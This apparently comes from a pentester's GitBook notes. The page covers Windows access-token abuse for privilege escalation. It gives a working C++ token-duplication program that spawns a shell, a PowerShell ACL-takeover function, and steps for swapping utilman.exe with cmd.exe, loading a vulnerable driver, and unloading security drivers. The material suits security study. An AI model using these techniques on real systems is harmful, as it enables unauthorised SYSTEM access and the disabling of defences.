
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Abuse Tokens Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="Buffer overflow.html" />
    
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../">
            
                <a href="../../">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" >
            
                <a target="_blank" href="https://twitter.com/HackerOtter">
            
                    
                    Follow On Twitter
            
                </a>
            

            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="2.1" >
            
                <span>
            
                    
                    Formation
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" >
            
                <span>
            
                    
                    Malware Development
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1.1" data-path="../../Formation/RTO - Malware Development/0 - Introduction.html">
            
                <a href="../../Formation/RTO - Malware Development/0 - Introduction.html">
            
                    
                    Introduction
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.2" data-path="../../Formation/RTO - Malware Development/1 - PE.html">
            
                <a href="../../Formation/RTO - Malware Development/1 - PE.html">
            
                    
                    PE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.3" data-path="../../Formation/RTO - Malware Development/2 - Payload Storage.html">
            
                <a href="../../Formation/RTO - Malware Development/2 - Payload Storage.html">
            
                    
                    Payload Storage
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.4" data-path="../../Formation/RTO - Malware Development/3 - Payload Encryption.html">
            
                <a href="../../Formation/RTO - Malware Development/3 - Payload Encryption.html">
            
                    
                    Payload Encryption
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.5" data-path="../../Formation/RTO - Malware Development/4 - Function Call Obfuscation.html">
            
                <a href="../../Formation/RTO - Malware Development/4 - Function Call Obfuscation.html">
            
                    
                    Function Call Obfuscation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.1.1.6" data-path="../../Formation/RTO - Malware Development/5 - Backdooring PE.html">
            
                <a href="../../Formation/RTO - Malware Development/5 - Backdooring PE.html">
            
                    
                    Backdooring PE
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="3.1" >
            
                <span>
            
                    
                    Malware
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.1" >
            
                <span>
            
                    
                    Docs
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="3.1.1.1" data-path="../../Malware/Docs/Code snippet.html">
            
                <a href="../../Malware/Docs/Code snippet.html">
            
                    
                    Code Snippet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.1.2" data-path="../../Malware/Docs/Dumpbin.html">
            
                <a href="../../Malware/Docs/Dumpbin.html">
            
                    
                    Dumpbin
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.1.3" data-path="../../Malware/Docs/NTStructure.html">
            
                <a href="../../Malware/Docs/NTStructure.html">
            
                    
                    NTStructure
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.1.4" data-path="../../Malware/Docs/Passing arguments.html">
            
                <a href="../../Malware/Docs/Passing arguments.html">
            
                    
                    Passing Arguments
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="3.1.2" data-path="../../Malware/CoffLoader.html">
            
                <a href="../../Malware/CoffLoader.html">
            
                    
                    COFF Loader
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.3" data-path="../../Malware/Elastic EDR.html">
            
                <a href="../../Malware/Elastic EDR.html">
            
                    
                    Elastic EDR
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.4" data-path="../../Malware/ETW.html">
            
                <a href="../../Malware/ETW.html">
            
                    
                    ETW
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.5" data-path="../../Malware/Function hooking.html">
            
                <a href="../../Malware/Function hooking.html">
            
                    
                    Function Hooking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.6" data-path="../../Malware/Kernel callback.html">
            
                <a href="../../Malware/Kernel callback.html">
            
                    
                    Kernel Callback
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.7" data-path="../../Malware/Module stomping.html">
            
                <a href="../../Malware/Module stomping.html">
            
                    
                    Module Stomping
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.1.8" data-path="../../Malware/Reflective DLL injection.html">
            
                <a href="../../Malware/Reflective DLL injection.html">
            
                    
                    Reflective DLL Injection
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="4.1" >
            
                <span>
            
                    
                    Pentest
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.1" >
            
                <span>
            
                    
                    Cloud
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.1.1" data-path="../Cloud/Azure.html">
            
                <a href="../Cloud/Azure.html">
            
                    
                    Azure
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.1.2" >
            
                <span>
            
                    
                    Configuration Review
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.2.1" data-path="../Configuration review/Database.html">
            
                <a href="../Configuration review/Database.html">
            
                    
                    Database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.2.2" data-path="../Configuration review/Kubernetes.html">
            
                <a href="../Configuration review/Kubernetes.html">
            
                    
                    Kubernetes
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.2.3" data-path="../Configuration review/KubernetesCIS.html">
            
                <a href="../Configuration review/KubernetesCIS.html">
            
                    
                    KubernetesCIS
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.1.3" >
            
                <span>
            
                    
                    Services
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.3.1" data-path="../Services/AD.html">
            
                <a href="../Services/AD.html">
            
                    
                    AD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.2" data-path="../Services/DNS.html">
            
                <a href="../Services/DNS.html">
            
                    
                    DNS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.3" data-path="../Services/IPMI.html">
            
                <a href="../Services/IPMI.html">
            
                    
                    IPMI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.4" data-path="../Services/Kerberos.html">
            
                <a href="../Services/Kerberos.html">
            
                    
                    Kerberos
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.5" data-path="../Services/LDAP.html">
            
                <a href="../Services/LDAP.html">
            
                    
                    LDAP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.6" data-path="../Services/Memcached.html">
            
                <a href="../Services/Memcached.html">
            
                    
                    Memcached
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.7" data-path="../Services/NFS.html">
            
                <a href="../Services/NFS.html">
            
                    
                    NFS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.8" data-path="../Services/Oracle database.html">
            
                <a href="../Services/Oracle database.html">
            
                    
                    Oracle Database
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.9" data-path="../Services/MSSQL.html">
            
                <a href="../Services/MSSQL.html">
            
                    
                    MSSQL
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.10" data-path="../Services/RPC.html">
            
                <a href="../Services/RPC.html">
            
                    
                    RPC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.11" data-path="../Services/SMB.html">
            
                <a href="../Services/SMB.html">
            
                    
                    SMB
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.12" data-path="../Services/SNMP.html">
            
                <a href="../Services/SNMP.html">
            
                    
                    SNMP
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.13" data-path="../Services/Tomcat.html">
            
                <a href="../Services/Tomcat.html">
            
                    
                    Tomcat
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.3.14" data-path="../Services/WebDAV.html">
            
                <a href="../Services/WebDAV.html">
            
                    
                    WebDAV
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.1.4" >
            
                <span>
            
                    
                    Techniques
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="4.1.4.1" data-path="Abuse tokens.html">
            
                <a href="Abuse tokens.html">
            
                    
                    Abuse Tokens
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.2" data-path="Buffer overflow.html">
            
                <a href="Buffer overflow.html">
            
                    
                    Buffer Overflow
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.3" data-path="Command injection.html">
            
                <a href="Command injection.html">
            
                    
                    Command Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.4" data-path="Data exfiltration.html">
            
                <a href="Data exfiltration.html">
            
                    
                    Data Exfiltration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.5" data-path="Exploit handles.html">
            
                <a href="Exploit handles.html">
            
                    
                    Exploit handles
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.6" data-path="Filtering.html">
            
                <a href="Filtering.html">
            
                    
                    Filtering
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.7" data-path="Kioske escape.html">
            
                <a href="Kioske escape.html">
            
                    
                    Kioske Escape
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.8" data-path="LFI.html">
            
                <a href="LFI.html">
            
                    
                    LFI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.9" data-path="Password spraying.html">
            
                <a href="Password spraying.html">
            
                    
                    Password Spraying
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.10" data-path="Pivoting.html">
            
                <a href="Pivoting.html">
            
                    
                    Pivoting
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.11" >
            
                <span>
            
                    
                    Privilege Escalation
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.4.11.1" data-path="Privileges escalation/Windows.html">
            
                <a href="Privileges escalation/Windows.html">
            
                    
                    Windows
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.11.2" data-path="Privileges escalation/Linux.html">
            
                <a href="Privileges escalation/Linux.html">
            
                    
                    Linux
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.1.4.12" data-path="Reverse shell.html">
            
                <a href="Reverse shell.html">
            
                    
                    Reverse Shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.13" data-path="Shellshock.html">
            
                <a href="Shellshock.html">
            
                    
                    Shellshock
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.14" data-path="SQL injection.html">
            
                <a href="SQL injection.html">
            
                    
                    SQL Injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.4.15" data-path="SSTI.html">
            
                <a href="SSTI.html">
            
                    
                    SSTI
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.1.5" >
            
                <span>
            
                    
                    Technology
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.5.1" data-path="../Technology/AD.html">
            
                <a href="../Technology/AD.html">
            
                    
                    AD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.5.2" data-path="../Technology/IOS.html">
            
                <a href="../Technology/IOS.html">
            
                    
                    IOS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.5.3" data-path="../Technology/NAC.html">
            
                <a href="../Technology/NAC.html">
            
                    
                    NAC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.5.4" data-path="../Technology/Port Knocking.html">
            
                <a href="../Technology/Port Knocking.html">
            
                    
                    Port Knocking
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.5.5" data-path="../Technology/SAML.html">
            
                <a href="../Technology/SAML.html">
            
                    
                    SAML
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.5.6" data-path="../Technology/SAP.html">
            
                <a href="../Technology/SAP.html">
            
                    
                    SAP
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="4.1.6" >
            
                <span>
            
                    
                    Tools
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.1.6.1" data-path="../Tools/BloundHound.html">
            
                <a href="../Tools/BloundHound.html">
            
                    
                    BloundHound
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.2" data-path="../Tools/CME.html">
            
                <a href="../Tools/CME.html">
            
                    
                    CME
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.3" data-path="../Tools/Curl.html">
            
                <a href="../Tools/Curl.html">
            
                    
                    Curl
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.4" data-path="../Tools/Ffuf.html">
            
                <a href="../Tools/Ffuf.html">
            
                    
                    FFUF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.5" data-path="../Tools/Find.html">
            
                <a href="../Tools/Find.html">
            
                    
                    Find
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.6" data-path="../Tools/Hydra.html">
            
                <a href="../Tools/Hydra.html">
            
                    
                    Hydra
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.7" data-path="../Tools/PowerView.html">
            
                <a href="../Tools/PowerView.html">
            
                    
                    PowerView
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.8" data-path="../Tools/Powershell.html">
            
                <a href="../Tools/Powershell.html">
            
                    
                    Powershell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.9" data-path="../Tools/Responder.html">
            
                <a href="../Tools/Responder.html">
            
                    
                    Responder
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.10" data-path="../Tools/Rubeus.html">
            
                <a href="../Tools/Rubeus.html">
            
                    
                    Rubeus
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.11" data-path="../Tools/Strace.html">
            
                <a href="../Tools/Strace.html">
            
                    
                    Strace
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.1.6.12" data-path="../Tools/Wfuzz.html">
            
                <a href="../Tools/Wfuzz.html">
            
                    
                    Wfuzz
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="divider"></li>
        
        
    
        <li class="chapter " data-level="5.1" >
            
                <span>
            
                    
                    Rainy Sunday
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="5.1.1" data-path="../../Serveur/KMS/KMS.html">
            
                <a href="../../Serveur/KMS/KMS.html">
            
                    
                    KMS Activation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="5.1.2" data-path="../../Serveur/LicenceKey.html">
            
                <a href="../../Serveur/LicenceKey.html">
            
                    
                    Licence Key
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../.." >Abuse Tokens</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="abuse-tokens">Abuse Tokens</h1>
<h1 id="table-of-content">Table of content</h1>
<!-- toc -->
<ul>
<li><a href="#security-tokens">Security Tokens</a><ul>
<li><a href="#display-token-information">Display token information</a><ul>
<li><a href="#whoami">Whoami</a></li>
<li><a href="#process-explorer">Process Explorer</a></li>
</ul>
</li>
<li><a href="#token-types">Token types</a><ul>
<li><a href="#primary-token">Primary token</a></li>
<li><a href="#impersonation-token">Impersonation token</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#duplicate-token">Duplicate token</a></li>
<li><a href="#interesting-privileges">Interesting privileges</a><ul>
<li><a href="#seimpersonateprivilege">SeImpersonatePrivilege</a></li>
<li><a href="#seassignprimaryprivilege">SeAssignPrimaryPrivilege</a></li>
<li><a href="#setcbprivilege">SeTcbPrivilege</a></li>
<li><a href="#sebackupprivilege">SeBackupPrivilege</a></li>
<li><a href="#serestoreprivilege">SeRestorePrivilege</a></li>
<li><a href="#secreatetokenprivilege">SeCreateTokenPrivilege</a></li>
<li><a href="#seloaddriverprivilege">SeLoadDriverPrivilege</a></li>
<li><a href="#setakeownershipprivilege">SeTakeOwnershipPrivilege</a></li>
<li><a href="#sedebugprivilege">SeDebugPrivilege</a></li>
</ul>
</li>
<li><a href="#resources">Resources</a></li>
</ul>
<!-- tocstop -->
<h1 id="security-tokens">Security Tokens</h1>
<p>Each users logged on the system get an <code>access token</code>. Every process launched by this user contains a copy of this <code>access token</code>.</p>
<p>This token is used to :</p>
<ul>
<li>Identify the user (contains the user <code>SID</code>)</li>
<li>Identify the user&apos;s groups</li>
<li>Identify the user&apos;s privileges</li>
</ul>
<h2 id="display-token-information">Display token information</h2>
<h3 id="whoami">Whoami</h3>
<p>The token information can be easily displayed using the <code>whoami /all</code> command. </p>
<p>This command display ifnormation about the current user token.</p>
<h3 id="process-explorer">Process Explorer</h3>
<p><code>Process Explorer</code> can be also used to display information about the token contained in a process:</p>
<p><img src="img/AbuseTokens/procexpToken.png" alt="Process explorer displaying token information"></p>
<h2 id="token-types">Token types</h2>
<p>There are two types of tokens :</p>
<ul>
<li>Primary token</li>
<li>Impersonation token</li>
</ul>
<h3 id="primary-token">Primary token</h3>
<p>These tokens can only be associated to process. They represent the process security subject.</p>
<p>The token creation and association to a process are privileged operations that need two different set of privileges.</p>
<p>The standard workflow is :</p>
<ol>
<li>The authentication service create the token</li>
<li>The logon service associates it to the user&apos;s operating system shell</li>
<li>Process launched will unherit the token from the parent process</li>
</ol>
<h3 id="impersonation-token">Impersonation token</h3>
<p>These tokens allows an application to temporarily impersonate a given user.</p>
<p>There are 4 level of impersonation:</p>
<ul>
<li><code>Anonymous</code> : the server get rights of an unidentified user</li>
<li><code>Identification</code> : the server can access to the user identity but is not granted its rights</li>
<li><code>Impersonation</code> : the server can act with the same privileges than the impersonated user</li>
<li><code>Delegation</code> : same as impersonation but also applied to remote systems</li>
</ul>
<p><code>Impersonation token</code> is only available on threads.</p>
<h1 id="duplicate-token">Duplicate token</h1>
<ol>
<li>Open the process : <code>OpenProcess</code></li>
<li>Get an handle to the token : <code>OpenProcessToken</code></li>
<li>Duplicate the token : <code>DuplicateTokenEx</code></li>
<li>Create a new process with the token : <code>CreateProcessWithToken</code></li>
</ol>
<pre><code class="lang-cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span>

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> * argv[])</span> </span>{
    <span class="hljs-keyword">char</span> a;
    HANDLE processHandle;
    HANDLE tokenHandle = <span class="hljs-literal">NULL</span>;
    HANDLE duplicateTokenHandle = <span class="hljs-literal">NULL</span>;
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInformation;
    <span class="hljs-comment">// Change with the PID of the process to impersonate</span>
    DWORD PID_TO_IMPERSONATE = <span class="hljs-number">3060</span>;
    <span class="hljs-comment">// Change with the executable to launch</span>
    <span class="hljs-keyword">wchar_t</span> cmdline[] = <span class="hljs-string">L&quot;C:\\shell.cmd&quot;</span>;
    ZeroMemory(&amp;startupInfo, <span class="hljs-keyword">sizeof</span>(STARTUPINFO));
    ZeroMemory(&amp;processInformation, <span class="hljs-keyword">sizeof</span>(PROCESS_INFORMATION));
    startupInfo.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFO);    

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">true</span>, PID_TO_IMPERSONATE);
    OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &amp;tokenHandle);
    DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, <span class="hljs-literal">NULL</span>, SecurityImpersonation, TokenPrimary, &amp;duplicateTokenHandle);            
    CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, <span class="hljs-literal">NULL</span>, cmdline, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;startupInfo, &amp;processInformation);

    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span> &gt;&gt; a;
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h1 id="interesting-privileges">Interesting privileges</h1>
<h2 id="seimpersonateprivilege">SeImpersonatePrivilege</h2>
<p>Any process with this privilege can impersonate any token as long as it can open an handle to it. Thus, it is not possible to create new token through this privilege.</p>
<p>For example, the process can impersonnate a Windows <code>DCOM</code> token to perform <code>NTLM</code>authentication and launch a <code>SYSTEM</code> process. This path is automatized through the <code>Potato</code>suite.</p>
<h2 id="seassignprimaryprivilege">SeAssignPrimaryPrivilege</h2>
<p>It use the same method than <code>SeImpersonatePrivilege</code> to retrieve a privileged token. Then, this privilege can be leveraged to assign a <code>primary token</code> to a new or suspended process.</p>
<p>Indeed, with the privileged token, it is possible to derivate a <code>primary token</code> through the <code>DuplicateTokenEx</code> Windows API. Then this <code>primary token</code> can be assigned to a new process through the <code>CreateProcessAsUser</code> Windows API.</p>
<h2 id="setcbprivilege">SeTcbPrivilege</h2>
<p>This privilege allows to use <code>KERB_S4U_LOGON</code> to : </p>
<ul>
<li>Get an <code>impersonation token</code> for any user without needing their credentials</li>
<li>Add an arbitrary group to the token</li>
<li>Set the toeken&apos;s integrity level to medium and assign it to the current thread through the <code>SetThreadToekn</code> Windows API.</li>
</ul>
<h2 id="sebackupprivilege">SeBackupPrivilege</h2>
<p>This privilege grant <code>read</code> access to the whole filesystem. It can be used through the <code>robocopy \b</code>executable to copy interesting files such as <code>SAM</code>, <code>SYSTEM</code> hives or <code>NTDS</code>.</p>
<p>Likewise, this privilege can be leveraged to change the permission of the selected path :</p>
<pre><code class="lang-powershell"><span class="hljs-comment"># https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1</span>
<span class="hljs-comment"># https://github.com/giuliano108/SeBackupPrivilege</span>

<span class="hljs-keyword">function</span> Acl-FullControl {<span class="hljs-keyword">param</span> (<span class="hljs-variable">$user</span>,<span class="hljs-variable">$path</span>)
    <span class="hljs-variable">$help</span> = @<span class="hljs-string">&quot;
    .SYNOPSIS
        Acl-FullControl
        PowerShell Function: Acl-FullControl
        Author: Luis Vacas (CyberVaca)
        Required dependencies: None
        Optional dependencies: None
    .DESCRIPTION
    .EXAMPLE
        Acl-FullControl -user domain\usuario -path c:\users\administrador
        Description
        -----------
        If you have the SeBackupPrivilege privilege. You can change the permissions to the path you select.
    &quot;</span>@
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span> <span class="hljs-nomarkup">-eq</span> <span class="hljs-literal">$null</span> -or <span class="hljs-variable">$path</span> <span class="hljs-nomarkup">-eq</span> <span class="hljs-literal">$null</span>) {<span class="hljs-variable">$help</span>} <span class="hljs-keyword">else</span> {
        <span class="hljs-string">&quot;[+] Current permissions:&quot;</span>
        <span class="hljs-built_in">get-acl</span> <span class="hljs-variable">$path</span> | fl
        <span class="hljs-string">&quot;[+] Changing permissions to <span class="hljs-variable">$path</span>&quot;</span>
        <span class="hljs-variable">$acl</span> = <span class="hljs-built_in">get-acl</span> <span class="hljs-variable">$path</span>
        <span class="hljs-variable">$aclpermisos</span> = <span class="hljs-variable">$user</span>,<span class="hljs-string">&apos;FullControl&apos;</span>,<span class="hljs-string">&apos;ContainerInherit,ObjectInherit&apos;</span>,<span class="hljs-string">&apos;None&apos;</span>,<span class="hljs-string">&apos;Allow&apos;</span>
        <span class="hljs-variable">$permisoacl</span> = <span class="hljs-built_in">new-object</span> System.Security.AccessControl.FileSystemAccessRule <span class="hljs-variable">$aclpermisos</span>
        <span class="hljs-variable">$acl</span>.AddAccessRule(<span class="hljs-variable">$permisoacl</span>)
        <span class="hljs-built_in">set-acl</span> -Path <span class="hljs-variable">$path</span> -AclObject <span class="hljs-variable">$acl</span>
        <span class="hljs-string">&quot;[+] Acls changed successfully.&quot;</span>
        <span class="hljs-built_in">get-acl</span> -path <span class="hljs-variable">$path</span> | fl
    }
}
</code></pre>
<h2 id="serestoreprivilege">SeRestorePrivilege</h2>
<p>This privilege allows write access on the full filesystem. It can be leverage to overwritte services, <code>DLL</code>, or set debuggers.</p>
<p>The exploitation follows these steps:</p>
<ol>
<li>Run a powershell with <code>SeRestorePrivilege</code></li>
<li>Enable the privilege using <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1" target="_blank"><code>Enable-SeRestorePrivilege</code></a></li>
<li>Change the <code>utilman.exe</code> by <code>cmd.exe</code></li>
<li>Lock the computer and press <code>WIN+U</code></li>
</ol>
<h2 id="secreatetokenprivilege">SeCreateTokenPrivilege</h2>
<p>This privilege is intersting only if it is also possible to impersonate token (whatever the way). For exemple, a user can impersonate the token if it is for the same user and the integrity level is less or equal to the current process integrity level.</p>
<p>Then, it is possible to create an <code>impersonation token</code> and add to it to privileged group <code>SID</code>.</p>
<p>Likewise, it is possible to create an arbitrary token and include <code>Administrator</code> rights through <code>NtCreateToken</code>.</p>
<h2 id="seloaddriverprivilege">SeLoadDriverPrivilege</h2>
<p>This privilege allows to load and unload device drivers.
The exploitation path can be found <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-accounts-and-token-privileges#seloaddriverprivilege" target="_blank">here</a></p>
<p>In a nutshell the exploitation follows these steps:</p>
<ol>
<li>Load a buggy kernel driver such as <code>szkg64.sys</code></li>
<li>Exploit the driver vulnerability</li>
</ol>
<p>Likewise, the privilege can be used to remove security-related driver with the <code>ftlMC ${driverName}</code> builtin command.</p>
<h2 id="setakeownershipprivilege">SeTakeOwnershipPrivilege</h2>
<p>This privilege is similar to <code>SeRestorePrivilege</code>. It allows a process to take ownership of any object by granting write access to the object.</p>
<p>The exploitation follows these steps:</p>
<ol>
<li><code>takeown.exe /f &quot;%windir%\system32&quot;</code></li>
<li><code>icalcs.exe &quot;%windir%\system32&quot; /grant &quot;%username%&quot;:F</code></li>
<li>Change <code>utilman.exe</code> by <code>cmd.exe</code></li>
<li>Lock the console and press Win+U</li>
</ol>
<h2 id="sedebugprivilege">SeDebugPrivilege</h2>
<p>Allows a process to debug another porcess including reading and writing memory. This privilege is interesting to bypass <code>AV/HIPS</code>.</p>
<p>For example, it can be used to duplicate the <code>lsass.exe</code> token.</p>
<h1 id="resources">Resources</h1>
<ul>
<li>Table of Windows processes and exploitation path : <a href="https://github.com/gtworek/Priv2Admin" target="_blank">https://github.com/gtworek/Priv2Admin</a></li>
<li>Exploit token for privesc : <a href="https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt" target="_blank">https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt</a></li>
</ul>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
